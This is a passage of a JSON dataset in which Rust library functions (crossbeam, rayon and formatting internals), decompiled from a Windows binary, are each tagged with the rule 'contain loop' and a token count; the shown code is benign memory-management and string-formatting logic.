8;\n            if (iVar10 == 0) {\n                uVar5 = CONCAT71(Var11, 1);\n                if ((iVar1 == 0x110000) || (cVar2 = (**(iVar20 + 0x18))(iVar8, arg1_00, arg2_00),  cVar2 != '\\0'))\n                goto code_r0x004074a6;\n                uVar5 = 0xffffffffffffffff;\n                goto code_r0x00407480;\n            }\n            cVar2 = (**(iVar20 + 0x20))(iVar8, iVar1);\n        } while (cVar2 == '\\0');\n        uVar5 = CONCAT71(Var11, 1);\ncode_r0x004074a6:\n        return uVar5 & 0xffffffff;\n    }\ncode_r0x004073e4:\n    // WARNING: Could not recover jumptable at 0x00407406. Too many branches\n    // WARNING: Treating indirect jump as call\n    uVar5 = (**(arg2[5] + 0x18))(arg2[4], arg1_00, arg2_00);\n    return uVar5;\n    while( true ) {\n        cVar2 = (**(iVar20 + 0x20))(iVar8, iVar1);\n        uVar4 = uVar5 + 1;\n        uVar5 = uVar4;\n        if (cVar2 != '\\0') break;\ncode_r0x00407480:\n        uVar4 = uVar9;\n        if (uVar5 - uVar9 == -1) break;\n    }\n    uVar5 = uVar4 & 0xffffffffffffff00 | uVar4 < uVar9;\n    goto code_r0x004074a6;\n}\n",
        "token_count": 6298
    },
    "c8b5a31c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid sym.core::ptr::drop_in_place_crossbeam_epoch::collector::Collector_::hc8b5a31c7f8871af(int64_t **arg1)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    uint64_t *puVar7;\n    uint64_t uVar8;\n    uint *puVar9;\n    uint in_XMM6_Da;\n    uint uVar10;\n    uint in_XMM6_Db;\n    uint uVar11;\n    uint in_XMM6_Dc;\n    uint uVar12;\n    uint in_XMM6_Dd;\n    uint uVar13;\n    uchar auStackX8 [32];\n    ulong uStack64;\n    \n    // core::ptr::drop_in_place<crossbeam_epoch::collector::Collector>::hc8b5a31c7f8871af\n    piVar2 = *arg1;\n    LOCK();\n    *piVar2 = *piVar2 + -1;\n    if (*piVar2 != 0) {\n        return;\n    }\n    uStack64 = 0x40b9be;\n    iVar5 = dbg.___chkstk_ms(arg1);\n    iVar5 = -iVar5;\n    *(&stack0x00001018 + iVar5) = CONCAT412(in_XMM6_Dd, CONCAT48(in_XMM6_Dc, CONCAT44(in_XMM6_Db, in_XMM6_Da)));\n    piVar2 = *arg1;\n    uVar8 = piVar2[0x40];\n    while (puVar7 = uVar8 & 0xfffffffffffffff8,  puVar7 != NULL) {\n        uVar8 = *puVar7;\n        uVar6 = uVar8 & 7;\n        *(&stack0x00000808 + iVar5) = uVar6;\n        if (uVar6 != 1) {\n            *(&stack0xfffffffffffffff0 + iVar5) = 0;\n            *(&uStack64 + iVar5) = 0x40bb38;\n            sym.core::panicking::assert_failed::h272e868455368c21\n                      (&stack0x00000808 + iVar5, 0x4483d0, &stack0xfffffffffffffff0 + iVar5, 0x445bf8);\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n        *(&uStack64 + iVar5) = 0x40ba05;\n        sym._ZN131__LT_crossbeam_epoch..internal..Local_u20_as_u20_crossbeam_epoch..sync..list..IsElement_LT_crossbeam_epoch..internal..Lo\n                  (puVar7, 0x445b60);\n    }\ncode_r0x0040ba25:\n    do {\n        uVar8 = piVar2[0x10];\n        uVar6 = *((uVar8 & 0xfffffffffffffff8) + 0x810);\n        puVar9 = uVar6 & 0xfffffffffffffff8;\n        if (puVar9 == NULL) {\n            *(auStackX8 + iVar5 + -8) = 0;\n        }\n        else {\n            LOCK();\n            puVar7 = piVar2 + 0x10;\n            uVar3 = *puVar7;\n            *puVar7 = *puVar7 ^ (uVar8 == uVar3) * (*puVar7 ^ uVar6);\n            if (uVar8 != uVar3) {\n                *(&stack0xfffffffffffffff0 + iVar5) = 1;\n                *(&uStack64 + iVar5) = 0x40ba62;\n                sym._ZN4core3ptr124drop_in_place_LT_core..result..Result_LT_core..option..Option_LT_crossbeam_epoch..internal..SealedBag_GT__C__LP\n                          (&stack0xfffffffffffffff0 + iVar5);\n                goto code_r0x0040ba25;\n            }\n            if (uVar8 == piVar2[0x20]) {\n                LOCK();\n                puVar7 = piVar2 + 0x20;\n                *puVar7 = *puVar7 ^ (uVar8 == *puVar7) * (*puVar7 ^ uVar6);\n            }\n            *(&uStack64 + iVar5) = 0x40ba8c;\n            sym.crossbeam_epoch::guard::Guard::defer_unchecked::h7ae233d637756e7f(0x445b60, uVar8);\n            uVar10 = *puVar9;\n            uVar11 = puVar9[1];\n            uVar12 = puVar9[2];\n            uVar13 = puVar9[3];\n            *(&uStack64 + iVar5) = 0x40baa4;\n            sym.memcpy(auStackX8 + iVar5, puVar9 + 4, 0x800);\n            *(&stack0xfffffffffffffff8 + iVar5) = CONCAT412(uVar13, CONCAT48(uVar12, CONCAT44(uVar11, uVar10)));\n        }\n        *(&uStack64 + iVar5) = 0x40baba;\n        sym.memcpy(&stack0x00000808 + iVar5, &stack0xfffffffffffffff8 + iVar5, 0x810);\n        iVar4 = *(&stack0x00000810 + iVar5);\n        *(&uStack64 + iVar5) = 0x40baca;\n        sym.core::ptr::drop_in_place_core::option::Option_crossbeam_epoch::internal::SealedBag__::hfc51ee622985ac6a\n                  (&stack0x00000808 + iVar5);\n        if (iVar4 == 0) {\n            iVar4 = piVar2[0x10];\n            *(&uStack64 + iVar5) = 0x40badf;\n            sym.core::mem::drop::heb6a229d2a5ab360(iVar4);\n            if (piVar2 != 0xffffffffffffffff) {\n                LOCK();\n                piVar1 = piVar2 + 1;\n                *piVar1 = *piVar1 + -1;\n                if (*piVar1 == 0) {\n                    *(&uStack64 + iVar5) = 0x40baf9;\n                    sym.__rust_dealloc(piVar2, 0x80);\n                }\n            }\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 1415
    },
    "7db22015": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid sym.core::ptr::drop_in_place_alloc::sync::Arc_rayon_core::registry::Registry__::h7db2201568d2142d(int64_t **arg1)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    uchar auVar3 [16];\n    int64_t iVar4;\n    int64_t iVar5;\n    \n    // core::ptr::drop_in_place<alloc::sync::Arc<rayon_core::registry::Registry>>::h7db2201568d2142d\n    piVar2 = *arg1;\n    LOCK();\n    *piVar2 = *piVar2 + -1;\n    if (*piVar2 != 0) {\n        return;\n    }\n    piVar2 = *arg1;\n    sym.core::ptr::drop_in_place_rayon_core::log::Logger_::h0afe3a00b5929015(piVar2 + 0x30);\n    iVar4 = piVar2[0x32];\n    for (iVar5 = piVar2[0x34] * 0x50; iVar5 != 0; iVar5 = iVar5 + -0x50) {\n        sym._ZN4core3ptr155drop_in_place_LT_alloc..sync..Arc_LT_crossbeam_utils..cache_padded..CachePadded_LT_crossbeam_deque..deque..Inne\n                  (iVar4 + 0x40);\n        iVar4 = iVar4 + 0x50;\n    }\n    if ((piVar2[0x33] != 0) && (auVar3 = ZEXT816(piVar2[0x33]) * ZEXT816(0x50),  SUB168(auVar3 >> 0x40, 0) == 0)) {\n        sym._ZN63__LT_alloc..alloc..Global_u20_as_u20_core..alloc..Allocator_GT_10deallocate17h82f390f816a480d0E.187\n                  (piVar2[0x32], SUB168(auVar3, 0), 8);\n    }\n    sym.core::ptr::drop_in_place_rayon_core::log::Logger_::h0afe3a00b5929015(piVar2 + 0x35);\n    if ((piVar2[0x38] != 0) && (auVar3 = ZEXT816(piVar2[0x38]) * ZEXT816(0x80),  SUB168(auVar3 >> 0x40, 0) == 0)) {\n        sym._ZN63__LT_alloc..alloc..Global_u20_as_u20_core..alloc..Allocator_GT_10deallocate17h82f390f816a480d0E.187\n                  (piVar2[0x37], SUB168(auVar3, 0), 0x80);\n    }\n    sym._crossbeam_deque::deque::Injector_T__as_core::ops::drop::Drop_::drop::h79661f8f1cce177b(piVar2 + 0x10);\n    sym._ZN4core3ptr274drop_in_place_LT_core..option..Option_LT_alloc..boxed..Box_LT_dyn_u20_core..ops..function..Fn_LT__LP_alloc..box\n              (piVar2 + 0x3b);\n    sym._ZN4core3ptr209drop_in_place_LT_core..option..Option_LT_alloc..boxed..Box_LT_dyn_u20_core..ops..function..Fn_LT__LP_usize_C__R\n              (piVar2 + 0x3d);\n    sym._ZN4core3ptr209drop_in_place_LT_core..option..Option_LT_alloc..boxed..Box_LT_dyn_u20_core..ops..function..Fn_LT__LP_usize_C__R\n              (piVar2 + 0x3f);\n    if (piVar2 != 0xffffffffffffffff) {\n        LOCK();\n        piVar1 = piVar2 + 1;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n    // WARNING: Could not recover jumptable at 0x00441124. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4520e0, 0, piVar2[-1]);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 954
    },
    "500436e3": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint64_t sym.rayon_core::sleep::counters::AtomicCounters::increment_jobs_event_counter_if::h500436e3248af3b4\n                   (uint64_t *arg1)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    \n    do {\n        uVar1 = *arg1;\n        if ((uVar1 & 0x100000000) != 0) {\n            return uVar1;\n        }\n        LOCK();\n        uVar2 = *arg1;\n        *arg1 = *arg1 ^ (uVar1 == uVar2) * (*arg1 ^ uVar1 + 0x100000000);\n    } while (uVar1 != uVar2);\n    return uVar1 + 0x100000000;\n}\n",
        "token_count": 174
    },
    "4328717d": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint64_t sym._T_as_core::fmt::Display_::fmt::h4328717df0c3b322(uint8_t **arg1, int64_t *arg2)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    uint64_t uVar5;\n    uint8_t *puVar6;\n    uint8_t *puVar7;\n    int64_t iVar8;\n    uint64_t uVar9;\n    int64_t iVar10;\n    unkbyte7 Var11;\n    uint8_t *puVar12;\n    uint8_t *arg1_00;\n    uint8_t *arg2_00;\n    int16_t iVar13;\n    int64_t iVar20;\n    uint8_t uVar26;\n    char cVar29;\n    char cVar30;\n    char cVar31;\n    uchar auVar27 [16];\n    uchar auVar28 [16];\n    uchar auVar32 [16];\n    uchar auVar33 [16];\n    unkuint3 Var14;\n    uint32_t uVar15;\n    unkuint5 Var16;\n    unkuint6 Var17;\n    unkuint7 Var18;\n    uint64_t uVar19;\n    unkbyte9 Var21;\n    unkbyte10 Var22;\n    uchar auVar23 [11];\n    uchar auVar24 [12];\n    uchar auVar25 [13];\n    \n    // <&T as core::fmt::Display>::fmt::h4328717df0c3b322\n    arg1_00 = *arg1;\n    arg2_00 = arg1[1];\n    if ((*arg2 != 1) && (arg2[2] != 1)) goto code_r0x004073e4;\n    if (arg2[2] == 1) {\n        puVar6 = NULL;\n        puVar12 = arg1_00;\n        for (iVar8 = arg2[3]; iVar8 != 0; iVar8 = iVar8 + -1) {\n            if (puVar12 == arg1_00 + arg2_00) goto code_r0x00407211;\n            uVar26 = *puVar12;\n            if (uVar26 < '\\0') {\n                if (uVar26 < 0xe0) {\n                    puVar7 = puVar12 + 2;\n                }\n                else if (uVar26 < 0xf0) {\n                    puVar7 = puVar12 + 3;\n                }\n                else {\n                    if ((puVar12[3] & 0x3f | (puVar12[2] & 0x3f) << 6 | (puVar12[1] & 0x3f) << 0xc |\n                        (uVar26 & 7) << 0x12) == 0x110000) goto code_r0x00407211;\n                    puVar7 = puVar12 + 4;\n                }\n            }\n            else {\n                puVar7 = puVar12 + 1;\n            }\n            puVar6 = puVar7 + (puVar6 - puVar12);\n            puVar12 = puVar7;\n        }\n        if ((puVar12 != arg1_00 + arg2_00) &&\n           ((((uVar26 = *puVar12,  -1 < uVar26 || (uVar26 < 0xe0)) || (uVar26 < 0xf0)) ||\n            ((puVar12[3] & 0x3f | (puVar12[2] & 0x3f) << 6 | (puVar12[1] & 0x3f) << 0xc | (uVar26 & 7) << 0x12) !=\n             0x110000)))) {\n            puVar12 = arg1_00;\n            if (puVar6 == NULL) {\n                puVar7 = NULL;\n            }\n            else if (puVar6 < arg2_00) {\n                puVar7 = puVar6;\n                if (arg1_00[puVar6] < -0x40) {\ncode_r0x00407204:\n                    puVar7 = puVar6;\n                    puVar12 = NULL;\n                }\n            }\n            else {\n                puVar7 = arg2_00;\n                if (puVar6 != arg2_00) goto code_r0x00407204;\n            }\n            if (puVar12 != NULL) {\n                arg1_00 = puVar12;\n                arg2_00 = puVar7;\n            }\n        }\n    }\ncode_r0x00407211:\n    if (*arg2 == 0) goto code_r0x004073e4;\n    uVar5 = arg2[1];\n    if (arg2_00 < 0x20) {\n        if (arg2_00 == NULL) {\n            uVar4 = 0;\n        }\n        else {\n            if (arg2_00 == 0x1) {\n                uVar4 = 0;\n                puVar12 = arg1_00;\n            }\n            else {\n                puVar12 = arg2_00 & 0xfffffffffffffffe;\n                uVar4 = (puVar12 + -2 >> 1) + 1;\n                uVar9 = uVar4 & 3;\n                if (puVar12 + -2 < 0x6) {\n                    iVar20 = 0;\n                    iVar10 = 0;\n                    iVar8 = 0;\n                }\n                else {\n                    uVar4 = uVar4 & 0xfffffffffffffffc;\n                    iVar20 = 0;\n                    iVar10 = 0;\n                    iVar8 = 0;\n                    do {\n                        uVar26 = -(*0x444400 < *(arg1_00 + iVar8));\n                        iVar13 = CONCAT11(-(*0x444401 < *(arg1_00 + iVar8) >> 8), uVar26);\n                        Var14 = CONCAT12(-(*0x444402 < '\\0'), iVar13);\n                        uVar15 = CONCAT13(-(*0x444403 < '\\0'), Var14);\n                        cVar2 = -(*0x444404 < '\\0');\n                        Var16 = CONCAT14(cVar2, uVar15);\n                        cVar29 = -(*0x444405 < '\\0');\n                        Var17 = CONCAT15(cVar29, Var16);\n                        cVar30 = -(*0x444406 < '\\0');\n                        Var18 = CONCAT16(cVar30, Var17);\n                        cVar31 = -(*0x444407 < '\\0');\n                        uVar19 = CONCAT17(cVar31, Var18);\n                        Var21 = CONCAT18(-(*0x444408 < '\\0'), uVar19);\n                        Var22 = CONCAT19(-(*0x444409 < '\\0'), Var21);\n                        auVar23 = CONCAT110(-(*0x44440a < '\\0'), Var22);\n                        auVar24 = CONCAT111(-(*0x44440b < '\\0'), auVar23);\n                        auVar25 = CONCAT112(-(*0x44440c < '\\0'), auVar24);\n                        auVar28 = CONCAT142(SUB1614(CONCAT133(SUB1613(CONCAT124(SUB1612(CONCAT115(SUB1611(CONCAT106(\n                                                            SUB1610(CONCAT97(SUB169(CONCAT88(SUB168(CONCAT79(SUB167(\n                                                            CONCAT610(SUB166(CONCAT511(SUB165(CONCAT412(SUB164(CONCAT313\n                                                            (SUB163(CONCAT214(SUB162(CONCAT115(cVar31, CONCAT114(cVar31\n                                                            , CONCAT113(-(*0x44440d < '\\0'), auVar25))) >> 0x70, 0), \n                                                            CONCAT113(cVar30, auVar25)) >> 0x68, 0), \n                                                            CONCAT112(cVar30, auVar24)) >> 0x60, 0), \n                                                            CONCAT111(cVar29, auVar23)) >> 0x58, 0), \n                                                            CONCAT110(cVar29, Var22)) >> 0x50, 0), \n                                                            CONCAT19(cVar2, Var21)) >> 0x48, 0), CONCAT18(cVar2, uVar19)\n                                                            ) >> 0x40, 0), (uVar19 >> 0x18) << 0x38) >> 0x38, 0), \n                                                            (Var18 >> 0x18) << 0x30) >> 0x30, 0), \n                                                            (Var17 >> 0x10) << 0x28) >> 0x28, 0), \n                                                            (Var16 >> 0x10) << 0x20) >> 0x20, 0), (uVar15 >> 8) << 0x18)\n                                                            >> 0x18, 0), (Var14 >> 8) << 0x10) >> 0x10, 0), \n                                            uVar26 | iVar13 << 8);\n                        auVar28 = pshuflw(auVar28, auVar28, 0xd4);\n                        auVar27 = CONCAT412(SUB164(auVar28 >> 0x60, 0), \n                                            CONCAT48(SUB164(auVar28 >> 0x20, 0), SUB168(auVar28, 0))) & *0x444410;\n                        uVar26 = -(*0x444400 < *(arg1_00 + iVar8 + 2));\n                        iVar13 = CONCAT11(-(*0x444401 < *(arg1_00 + iVar8 + 2) >> 8), uVar26);\n                        Var14 = CONCAT12(-(*0x444402 < '\\0'), iVar13);\n                        uVar15 = CONCAT13(-(*0x444403 < '\\0'), Var14);\n                        cVar2 = -(*0x444404 < '\\0');\n                        Var16 = CONCAT14(cVar2, uVar15);\n                        cVar29 = -(*0x444405 < '\\0');\n                        Var17 = CONCAT15(cVar29, Var16);\n                        cVar30 = -(*0x444406 < '\\0');\n                        Var18 = CONCAT16(cVar30, Var17);\n                        cVar31 = -(*0x444407 < '\\0');\n                        uVar19 = CONCAT17(cVar31, Var18);\n                        Var21 = CONCAT18(-(*0x444408 < '\\0'), uVar19);\n                        Var22 = CONCAT19(-(*0x444409 < '\\0'), Var21);\n                        auVar23 = CONCAT110(-(*0x44440a < '\\0'), Var22);\n                        auVar24 = CONCAT111(-(*0x44440b < '\\0'), auVar23);\n                        auVar25 = CONCAT112(-(*0x44440c < '\\0'), auVar24);\n                        auVar28 = CONCAT142(SUB1614(CONCAT133(SUB1613(CONCAT124(SUB1612(CONCAT115(SUB1611(CONCAT106(\n                                                            SUB1610(CONCAT97(SUB169(CONCAT88(SUB168(CONCAT79(SUB167(\n                                                            CONCAT610(SUB166(CONCAT511(SUB165(CONCAT412(SUB164(CONCAT313\n                                                            (SUB163(CONCAT214(SUB162(CONCAT115(cVar31, CONCAT114(cVar31\n                                                            , CONCAT113(-(*0x44440d < '\\0'), auVar25))) >> 0x70, 0), \n                                                            CONCAT113(cVar30, auVar25)) >> 0x68, 0), \n                                                            CONCAT112(cVar30, auVar24)) >> 0x60, 0), \n                                                            CONCAT111(cVar29, auVar23)) >> 0x58, 0), \n                                                            CONCAT110(cVar29, Var22)) >> 0x50, 0), \n                                                            CONCAT19(cVar2, Var21)) >> 0x48, 0), CONCAT18(cVar2, uVar19)\n                                                            ) >> 0x40, 0), (uVar19 >> 0x18) << 0x38) >> 0x38, 0), \n                                                            (Var18 >> 0x18) << 0x30) >> 0x30, 0), \n                                                            (Var17 >> 0x10) << 0x28) >> 0x28, 0), \n                                                            (Var16 >> 0x10) << 0x20) >> 0x20, 0), (uVar15 >> 8) << 0x18)\n                                                            >> 0x18, 0), (Var14 >> 8) << 0x10) >> 0x10, 0), \n                                            uVar26 | iVar13 << 8);\n                        auVar28 = pshuflw(auVar28, auVar28, 0xd4);\n                        auVar28 = CONCAT412(SUB164(auVar28 >> 0x60, 0), \n                                            CONCAT48(SUB164(auVar28 >> 0x20, 0), SUB168(auVar28, 0))) & *0x444410;\n                        uVar26 = -(*0x444400 < *(arg1_00 + iVar8 + 4));\n                        iVar13 = CONCAT11(-(*0x444401 < *(arg1_00 + iVar8 + 4) >> 8), uVar26);\n                        Var14 = CONCAT12(-(*0x444402 < '\\0'), iVar13);\n                        uVar15 = CONCAT13(-(*0x444403 < '\\0'), Var14);\n                        cVar2 = -(*0x444404 < '\\0');\n                        Var16 = CONCAT14(cVar2, uVar15);\n                        cVar29 = -(*0x444405 < '\\0');\n                        Var17 = CONCAT15(cVar29, Var16);\n                        cVar30 = -(*0x444406 < '\\0');\n                        Var18 = CONCAT16(cVar30, Var17);\n                        cVar31 = -(*0x444407 < '\\0');\n                        uVar19 = CONCAT17(cVar31, Var18);\n                        Var21 = CONCAT18(-(*0x444408 < '\\0'), uVar19);\n                        Var22 = CONCAT19(-(*0x444409 < '\\0'), Var21);\n                        auVar23 = CONCAT110(-(*0x44440a < '\\0'), Var22);\n                        auVar24 = CONCAT111(-(*0x44440b < '\\0'), auVar23);\n                        auVar25 = CONCAT112(-(*0x44440c < '\\0'), auVar24);\n                        auVar32 = CONCAT142(SUB1614(CONCAT133(SUB1613(CONCAT124(SUB1612(CONCAT115(SUB1611(CONCAT106(\n                                                            SUB1610(CONCAT97(SUB169(CONCAT88(SUB168(CONCAT79(SUB167(\n                                                            CONCAT610(SUB166(CONCAT511(SUB165(CONCAT412(SUB164(CONCAT313\n                                                            (SUB163(CONCAT214(SUB162(CONCAT115(cVar31, CONCAT114(cVar31\n                                                            , CONCAT113(-(*0x44440d < '\\0'), auVar25))) >> 0x70, 0), \n                                                            CONCAT113(cVar30, auVar25)) >> 0x68, 0), \n                                                            CONCAT112(cVar30, auVar24)) >> 0x60, 0), \n                                                            CONCAT111(cVar29, auVar23)) >> 0x58, 0), \n                                                            CONCAT110(cVar29, Var22)) >> 0x50, 0), \n                                                            CONCAT19(cVar2, Var21)) >> 0x48, 0), CONCAT18(cVar2, uVar19)\n                                                            ) >> 0x40, 0), (uVar19 >> 0x18) << 0x38) >> 0x38, 0), \n                                                            (Var18 >> 0x18) << 0x30) >> 0x30, 0), \n                                                            (Var17 >> 0x10) << 0x28) >> 0x28, 0), \n                                                            (Var16 >> 0x10) << 0x20) >> 0x20, 0), (uVar15 >> 8) << 0x18)\n                                                            >> 0x18, 0), (Var14 >> 8) << 0x10) >> 0x10, 0), \n                                            uVar26 | iVar13 << 8);\n                        auVar32 = pshuflw(auVar32, auVar32, 0xd4);\n                        auVar33 = CONCAT412(SUB164(auVar32 >> 0x60, 0), \n                                            CONCAT48(SUB164(auVar32 >> 0x20, 0), SUB168(auVar32, 0))) & *0x444410;\n                        uVar26 = -(*0x444400 < *(arg1_00 + iVar8 + 6));\n                        iVar13 = CONCAT11(-(*0x444401 < *(arg1_00 + iVar8 + 6) >> 8), uVar26);\n                        Var14 = CONCAT12(-(*0x444402 < '\\0'), iVar13);\n                        uVar15 = CONCAT13(-(*0x444403 < '\\0'), Var14);\n                        cVar2 = -(*0x444404 < '\\0');\n                        Var16 = CONCAT14(cVar2, uVar15);\n                        cVar29 = -(*0x444405 < '\\0');\n                        Var17 = CONCAT15(cVar29, Var16);\n                        cVar30 = -(*0x444406 < '\\0');\n                        Var18 = CONCAT16(cVar30, Var17);\n                        cVar31 = -(*0x444407 < '\\0');\n                        uVar19 = CONCAT17(cVar31, Var18);\n                        Var21 = CONCAT18(-(*0x444408 < '\\0'), uVar19);\n                        Var22 = CONCAT19(-(*0x444409 < '\\0'), Var21);\n                        auVar23 = CONCAT110(-(*0x44440a < '\\0'), Var22);\n                        auVar24 = CONCAT111(-(*0x44440b < '\\0'), auVar23);\n                        auVar25 = CONCAT112(-(*0x44440c < '\\0'), auVar24);\n                        auVar32 = CONCAT142(SUB1614(CONCAT133(SUB1613(CONCAT124(SUB1612(CONCAT115(SUB1611(CONCAT106(\n                                                            SUB1610(CONCAT97(SUB169(CONCAT88(SUB168(CONCAT79(SUB167(\n                                                            CONCAT610(SUB166(CONCAT511(SUB165(CONCAT412(SUB164(CONCAT313\n                                                            (SUB163(CONCAT214(SUB162(CONCAT115(cVar31, CONCAT114(cVar31\n                                                            , CONCAT113(-(*0x44440d < '\\0'), auVar25))) >> 0x70, 0), \n                                                            CONCAT113(cVar30, auVar25)) >> 0x68, 0), \n                                                            CONCAT112(cVar30, auVar24)) >> 0x60, 0), \n                                                            CONCAT111(cVar29, auVar23)) >> 0x58, 0), \n                                                            CONCAT110(cVar29, Var22)) >> 0x50, 0), \n                                                            CONCAT19(cVar2, Var21)) >> 0x48, 0), CONCAT18(cVar2, uVar19)\n                                                            ) >> 0x40, 0), (uVar19 >> 0x18) << 0x38) >> 0x38, 0), \n                                                            (Var18 >> 0x18) << 0x30) >> 0x30, 0), \n                                                            (Var17 >> 0x10) << 0x28) >> 0x28, 0), \n                                                            (Var16 >> 0x10) << 0x20) >> 0x20, 0), (uVar15 >> 8) << 0x18)\n                                                            >> 0x18, 0), (Var14 >> 8) << 0x10) >> 0x10, 0), \n                                            uVar26 | iVar13 << 8);\n                        auVar32 = pshuflw(auVar32, auVar32, 0xd4);\n                        auVar32 = CONCAT412(SUB164(auVar32 >> 0x60, 0), \n                                            CONCAT48(SUB164(auVar32 >> 0x20, 0), SUB168(auVar32, 0))) & *0x444410;\n                        iVar20 = SUB168(auVar32, 0) +\n                                 SUB168(auVar33, 0) + SUB168(auVar28, 0) + SUB168(auVar27, 0) + iVar20;\n                        iVar10 = SUB168(auVar32 >> 0x40, 0) +\n                                 SUB168(auVar33 >> 0x40, 0) + SUB168(auVar28 >> 0x40, 0) +\n                                 SUB168(auVar27 >> 0x40, 0) + iVar10;\n                        iVar8 = iVar8 + 8;\n                        uVar4 = uVar4 - 4;\n                    } while (uVar4 != 0);\n                }\n                if (uVar9 != 0) {\n                    iVar3 = 0;\n                    do {\n                        uVar26 = -(*0x444400 < *(arg1_00 + iVar3 + iVar8));\n                        iVar13 = CONCAT11(-(*0x444401 < *(arg1_00 + iVar3 + iVar8) >> 8), uVar26);\n                        Var14 = CONCAT12(-(*0x444402 < '\\0'), iVar13);\n                        uVar15 = CONCAT13(-(*0x444403 < '\\0'), Var14);\n                        cVar2 = -(*0x444404 < '\\0');\n                        Var16 = CONCAT14(cVar2, uVar15);\n                        cVar29 = -(*0x444405 < '\\0');\n                        Var17 = CONCAT15(cVar29, Var16);\n                        cVar30 = -(*0x444406 < '\\0');\n                        Var18 = CONCAT16(cVar30, Var17);\n                        cVar31 = -(*0x444407 < '\\0');\n                        uVar4 = CONCAT17(cVar31, Var18);\n                        Var21 = CONCAT18(-(*0x444408 < '\\0'), uVar4);\n                        Var22 = CONCAT19(-(*0x444409 < '\\0'), Var21);\n                        auVar23 = CONCAT110(-(*0x44440a < '\\0'), Var22);\n                        auVar24 = CONCAT111(-(*0x44440b < '\\0'), auVar23);\n                        auVar25 = CONCAT112(-(*0x44440c < '\\0'), auVar24);\n                        auVar28 = CONCAT142(SUB1614(CONCAT133(SUB1613(CONCAT124(SUB1612(CONCAT115(SUB1611(CONCAT106(\n                                                            SUB1610(CONCAT97(SUB169(CONCAT88(SUB168(CONCAT79(SUB167(\n                                                            CONCAT610(SUB166(CONCAT511(SUB165(CONCAT412(SUB164(CONCAT313\n                                                            (SUB163(CONCAT214(SUB162(CONCAT115(cVar31, CONCAT114(cVar31\n                                                            , CONCAT113(-(*0x44440d < '\\0'), auVar25))) >> 0x70, 0), \n                                                            CONCAT113(cVar30, auVar25)) >> 0x68, 0), \n                                                            CONCAT112(cVar30, auVar24)) >> 0x60, 0), \n                                                            CONCAT111(cVar29, auVar23)) >> 0x58, 0), \n                                                            CONCAT110(cVar29, Var22)) >> 0x50, 0), \n                                                            CONCAT19(cVar2, Var21)) >> 0x48, 0), CONCAT18(cVar2, uVar4))\n                                                            >> 0x40, 0), (uVar4 >> 0x18) << 0x38) >> 0x38, 0), \n                                                            (Var18 >> 0x18) << 0x30) >> 0x30, 0), \n                                                            (Var17 >> 0x10) << 0x28) >> 0x28, 0), \n                                                            (Var16 >> 0x10) << 0x20) >> 0x20, 0), (uVar15 >> 8) << 0x18)\n                                                            >> 0x18, 0), (Var14 >> 8) << 0x10) >> 0x10, 0), \n                                            uVar26 | iVar13 << 8);\n                        auVar28 = pshuflw(auVar28, auVar28, 0xd4);\n                        auVar28 = CONCAT412(SUB164(auVar28 >> 0x60, 0), \n                                            CONCAT48(SUB164(auVar28 >> 0x20, 0), SUB168(auVar28, 0))) & *0x444410;\n                        iVar20 = iVar20 + SUB168(auVar28, 0);\n                        iVar10 = iVar10 + SUB168(auVar28 >> 0x40, 0);\n                        iVar3 = iVar3 + 2;\n                    } while (uVar9 * 2 != iVar3);\n                }\n                uVar4 = iVar10 + iVar20;\n                if (arg2_00 == puVar12) goto code_r0x004073c7;\n                puVar12 = puVar12 + arg1_00;\n            }\n            do {\n                uVar26 = *puVar12;\n                puVar12 = puVar12 + 1;\n                uVar4 = uVar4 + (-0x41 < uVar26);\n            } while (puVar12 != arg1_00 + arg2_00);\n        }\n    }\n    else {\n        uVar4 = dbg.do_count_chars(arg1_00, arg2_00);\n    }\ncode_r0x004073c7:\n    uVar9 = uVar5 - uVar4;\n    if (uVar4 <= uVar5 && uVar9 != 0) {\n        cVar2 = *(arg2 + 7);\n        if (cVar2 == '\\x03') {\n            cVar2 = '\\0';\n        }\n        if (cVar2 == '\\0') {\n            uVar5 = 0;\n        }\n        else if (cVar2 == '\\x01') {\n            uVar5 = uVar9;\n            uVar9 = 0;\n        }\n        else {\n            uVar5 = uVar9 >> 1;\n            uVar9 = uVar9 + 1 >> 1;\n        }\n        iVar8 = arg2[4];\n        iVar20 = arg2[5];\n        iVar1 = *(arg2 + 0x34);\n        iVar10 = uVar5 + 1;\n        do {\n            iVar10 = iVar10 + -1;\n            Var11 = iVar10 >> 8;\n            if (iVar10 == 0) {\n                uVar5 = CONCAT71(Var11, 1);\n                if ((iVar1 == 0x110000) || (cVar2 = (**(iVar20 + 0x18))(iVar8, arg1_00, arg2_00),  cVar2 != '\\0'))\n                goto code_r0x004074a6;\n                uVar5 = 0xffffffffffffffff;\n                goto code_r0x00407480;\n            }\n            cVar2 = (**(iVar20 + 0x20))(iVar8, iVar1);\n        } while (cVar2 == '\\0');\n        uVar5 = CONCAT71(Var11, 1);\ncode_r0x004074a6:\n        return uVar5 & 0xffffffff;\n    }\ncode_r0x004073e4:\n    // WARNING: Could not recover jumptable at 0x00407406. Too many branches\n    // WARNING: Treating indirect jump as call\n    uVar5 = (**(arg2[5] + 0x18))(arg2[4], arg1_00, arg2_00);\n    return uVar5;\n    while( true ) {\n        cVar2 = (**(iVar20 + 0x20))(iVar8, iVar1);\n        uVar4 = uVar5 + 1;\n        uVar5 = uVar4;\n        if (cVar2 != '\\0') break;\ncode_r0x00407480:\n        uVar4 = uVar9;\n        if (uVar5 - uVar9 == -1) break;\n    }\n    uVar5 = uVar4 & 0xffffffffffffff00 | uVar4 < uVar9;\n    goto code_r0x004074a6;\n}\n",
        "token_count": 6300
    },
    "a1fa8401": {
        "rules": [
